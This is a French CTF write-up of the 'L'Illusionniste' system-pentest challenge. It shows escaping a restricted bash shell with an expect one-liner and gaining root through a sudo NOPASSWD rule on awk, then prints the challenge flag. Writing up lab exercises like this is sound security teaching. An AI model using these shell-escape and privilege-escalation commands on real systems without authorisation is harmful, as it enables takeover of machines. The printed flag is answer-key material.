

# L'illusionniste

### Categorie

Pentest système
### Description

Trouvez votre chemin vers la liberté, puis élevez-vous au-delà des restrictions.
Le flag vous attend dans la demeure de celui qui contrôle tout, au sommet de ces lieux.

Credentials: `user:password`

Format : **24HIUT{flag}**
Auteur : **Fr4gments**

### Write Up

Nous arrivons sur le chall avec un message d'acceuil pour le moins étrange:
```
=======================================================================================================
Bienvenue dans le défi "L'Illusionniste" !

Un magicien ne révèle jamais ses secrets, mais parfois les scripts révèlent plus qu'ils ne devraient.
Quelque chose vous attend sur cette machine, caché derrière des couches d'automatisation.

Les outils sont souvent plus puissants qu'ils n'y paraissent, et certains langages peuvent faire bien plus que leur fonction première...

Trouvez votre chemin vers la liberté, puis élevez-vous au-delà des restrictions.
Le flag vous attend dans la demeure de celui qui contrôle tout, au sommet de ces lieux.

Bonne chance !
======================================================================================================
```

On remarque très vite que nous sommes dans un shell restreint:
```
$ cd ../  
bash: cd: restricted
```

Les commandes usuelles de Linux ne fonctionnenent pas, excepté `ls` et quelques autres:
```
$ ls $PATH
cat cp dircolors expect less ls more nano rbash
```

On a accès aux quelques binaires du répertoire /usr/local/rbin. `less` et `more` semblent être prometteurs s'échapper du shell, toutefois, toutes tentatives resteront infructueuses. 

Dans le message d'accueil, on peut y lire:
```
Quelque chose vous attend sur cette machine, caché derrière des couches d'automatisation.
```

Parmi les binaires disponibles, on y trouve `expect` qui sert à automatiser des intéractions avec des programmes intéractifs (SSH, FTP etc...).
Si on s'en refère à [GTFOBins](https://gtfobins.github.io/gtfobins/expect/) on peut s'évader du shell restreint avec `expect`:
```
$ expect -c 'spawn /bin/sh;interact'
```

À ce stade, on se retrouve hors du shell restreint, on a donc accès à beaucoup plus de choses. Notamment au binaire `sudo`. On en profite pour vérifer nos droits sur la machine:
```
$ /bin/sudo -l
User user may run the following commands on this machine:
(root) NOPASSWD: /bin/awk
```

Si on se remémore de la deuxième partie du message d'accueil:
```
Les outils sont souvent plus puissants qu'ils n'y paraissent, et certains langages peuvent faire bien plus que leur fonction première...
```

``awk`` étant un langage de programmation... On jette un nouveau coup d'oeil à  [GTFOBins](https://gtfobins.github.io/gtfobins/awk/), on apprend que l'on peut créer un nouveau shell avec awk:
```
awk 'BEGIN {system("/bin/sh")}'
```

Toutefois, ouvrir un nouveau shell avec awk sans droits supplémentaires nous servirait à rien, on va alors le faire avec sudo:
```
$ /bin/sudo /bin/awk 'BEGIN {system("/bin/sh")}'
```

Nous sommes maintenant ``root`` sur la machine:
```
# whoami
root
```

En se basant sur la dernière partie du message d'accueil:
```
Le flag vous attend dans la demeure de celui qui contrôle tout, au sommet de ces lieux.
```

Rendons nous dans le répertoire ``/root`` et lisons le flag:
```
# cat flag.txt
24HIUT{3XP3C7_7H3_35C4P3_4WK_Y0UR_W4Y_UP}
```

Félicitations !

### Flag

24HIUT{3XP3C7_7H3_35C4P3_4WK_Y0UR_W4Y_UP}